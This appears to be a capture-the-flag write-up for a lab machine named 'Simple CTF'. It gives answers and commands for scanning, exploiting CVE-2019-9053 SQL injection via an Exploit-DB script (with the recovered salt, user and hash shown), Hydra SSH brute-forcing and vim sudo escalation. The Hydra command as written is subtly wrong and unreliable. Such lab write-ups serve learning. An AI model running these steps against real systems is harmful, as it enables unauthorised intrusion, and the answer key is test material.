# Machine NAME : Simple CTF
# Machine IP   : 10.10.126.194

***TASK 1 : How many services are running under port 1000?***
```
: 2
: (Reference) Gathering/SimpleCTF_Scanning.txt
```

***TASK 2 : What is running on the higher port?***
```
ssh
```
***TASK 3 : What's the CVE you're using against the application?***
```
: CVE-2019-9053 

 SITE MAP SCANING : gobuster (Reference file : Gathering/SimpleCTF_gobuster.txt)
 1.EXPLOIT-DB LINK : https://www.exploit-db.com/exploits/46635 
 2.convert python2 to python3 command : 2to3 -w {file_name} 
 3.command :./46635.py -u http://{ip}/{dir}/ 
[+] Salt for password found: 1dac0d92e9fa6bb2 
[+] Username found: mitch 
[+] Email found: admin3@ 
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96 
```

***TASK 4: To what kind of vulnerability is the application vulnerable?***
```
sqli 
```

***TASK 5: What's the password?*** 
```
password is secret 
PASSWORD BRUTE FORCING (Hydra) 
hydra -l mitch -p rockyou.txt ssh://{ip}/
```

***TASK6 : Where can you login with the details obtained?***
```
ssh
```

***TASK 7 : What's the user flag?*** 
```
Do it 
```

***TASK 8: Is there any other user in the home directory? What's its name?***
```
sunbath
```

***TASK 9 :	What can you leverage to spawn a privileged shell?*** 
```
vim
```

***TASK 10 : What's the root flag?***
```
command : sudo -l 
command : vim privilge escalate!
```